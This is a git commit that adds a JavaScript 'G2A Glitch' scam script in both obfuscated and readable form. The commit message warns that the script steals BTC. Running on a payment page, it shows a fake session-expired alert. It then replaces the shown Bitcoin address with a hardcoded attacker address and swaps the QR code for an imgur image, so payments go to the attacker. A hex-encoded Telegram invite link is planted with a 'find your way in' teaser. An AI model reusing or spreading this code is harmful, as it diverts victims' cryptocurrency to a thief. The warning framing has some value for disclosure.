52a7a33adc58092c8c7bd76ad507c655182fafbc
mrblackx <63623649+rebl0x3r@users.noreply.github.com>
2022-06-01 02:10:48 +0200

    G2A Glitch - Source Code
    G2A Scammer Script Source Code
    
    Obfuscated + Deobfuscated (Human readable)
    
    Obfuscated : Line 2 - 27
    Deobfuscated : Line 38 - 58
    
    Please don't use it, it steals your BTC by replacing address.

---
+++ G2A Glitch.js
@@ -0,0 +1,58 @@
+
+/*
+ * G2A Obfuscated Source Code
+ * Deobfuscated by @f4c3r100
+
+var _g0 = ["G2A Session Expired enabled! Press OK to continue...", "row", "getElementsByClassName", "innerHTML", "BTC address: 18DrGVx5Bvg8tugx4GqcyWvdvAZiqRjDKL", "src", "code", "https://i.imgur.com/y3L309u.png", "length"];
+
+var _g1 = [_g0[0], _g0[1], _g0[2], _g0[3], _g0[4], _g0[5], _g0[6], _g0[7], _g0[8]];
+
+var _g2 = [_g1[0], _g1[1], _g1[2], _g1[3], _g1[4], _g1[5], _g1[6], _g1[7], _g1[8]];
+
+var _g3 = [_g2[0], _g2[1], _g2[2], _g2[3], _g2[4], _g2[5], _g2[6], _g2[7], _g2[8]];
+
+alert("G2A Session Expired enabled! Press OK to continue...");
+
+var _g4 = setInterval(
+	function () {
+		var _g5 = document[_g3[2]](_g3[1]);
+		_g5[1][_g3[3]] = _g3[4];
+		document[_g3[2]](_g3[6])[0][_g3[5]] = _g3[7];
+		var _g6 = document[_g3[2]](_g3[6]);
+		if (_g6[_g3[8]] > 0) {
+			clearInterval(_g4);
+		}
+	}
+,10);
+*/ 
+
+const group_access = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x2e\x6d\x65\x2f\x2b\x52\x4d\x36\x48\x43\x58\x6d\x4b\x41\x4d\x6f\x46\x52\x72\x6d\x4a"; // Find your way in :) TIP : print this variable out :o
+
+/*
+ * G2A Script Source Code (Human Readable)
+ * Deobfuscated by @f4c3r100
+ * Everyone who's talking about this is real is lieing and a scammmer.
+ *
+ */
+
+var _g0 = ["G2A Session Expired enabled! Press OK to continue...", "row", "getElementsByClassName", "innerHTML", "BTC address: 18DrGVx5Bvg8tugx4GqcyWvdvAZiqRjDKL", "src", "code", "https://i.imgur.com/y3L309u.png", "length"];
+
+var _g1 = [_g0[0], _g0[1], _g0[2], _g0[3], _g0[4], _g0[5], _g0[6], _g0[7], _g0[8]];
+
+var _g2 = [_g1[0], _g1[1], _g1[2], _g1[3], _g1[4], _g1[5], _g1[6], _g1[7], _g1[8]];
+
+var _g3 = [_g2[0], _g2[1], _g2[2], _g2[3], _g2[4], _g2[5], _g2[6], _g2[7], _g2[8]];
+
+alert("G2A Session Expired enabled! Press OK to continue...");
+
+var _g4 = setInterval(
+	function () {
+		var _g5 = document["getElementsByClassName"]("row");
+		_g5[1][_g3[3]] = "BTC address: 18DrGVx5Bvg8tugx4GqcyWvdvAZiqRjDKL";
+		document["getElementsByClassName"]("code")[0]["src"] = "https://i.imgur.com/y3L309u.png";
+		var _g6 = document["getElementsByClassName"]("code");
+		if (_g6["length"] > 0) {
+			clearInterval(_g4);
+		}
+	}
+,10);
